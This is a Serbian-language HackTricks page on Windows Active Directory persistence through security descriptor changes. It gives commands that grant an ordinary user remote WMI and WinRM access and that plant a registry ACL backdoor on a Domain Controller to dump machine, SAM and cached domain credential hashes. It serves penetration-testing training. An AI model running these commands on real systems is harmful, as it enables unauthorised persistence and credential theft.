# Bezbednosni deskriptori

{{#include ../../banners/hacktricks-training.md}}

## Bezbednosni deskriptori

[Prema dokumentaciji](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) definiše format koji se koristi za opisivanje bezbednosnog deskriptora. SDDL koristi ACE stringove za DACL i SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

**Bezbednosni deskriptori** se koriste za **čuvanje** **dozvola** koje **objekat** ima **nad** **objektom**. Ako možete samo da napravite **malu izmenu** u **bezbednosnom deskriptoru** objekta, možete dobiti veoma zanimljive privilegije nad tim objektom bez potrebe da budete član privilegovane grupe.

Dakle, ova persistence tehnika se zasniva na mogućnosti da osvojite svaku potrebnu privilegiju nad određenim objektima, kako biste mogli da izvršite zadatak koji obično zahteva admin privilegije, ali bez potrebe da budete admin.

### Pristup WMI-ju

Korisniku možete dati pristup da **daljinski izvršava WMI** [**koristeći ovo**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Pristup WinRM-u

Omogućite pristup **winrm PS konzoli korisniku** [**pomoću ovoga**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Udaljeni pristup hash vrednostima

Pristupite **registry-ju** i **dump hashes** kreiranjem **Reg backdoor-a pomoću** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** tako da u svakom trenutku možete preuzeti **hash računara**, **SAM** i sve keširane **AD** credential-e na računaru. Zato je veoma korisno dodeliti ovu dozvolu **običnom korisniku nad računarom Domain Controller-a**:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Pogledajte [**Silver Tickets**](silver-ticket.md) da biste saznali kako možete koristiti hash naloga računara Domain Controller-a.

## Reference

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
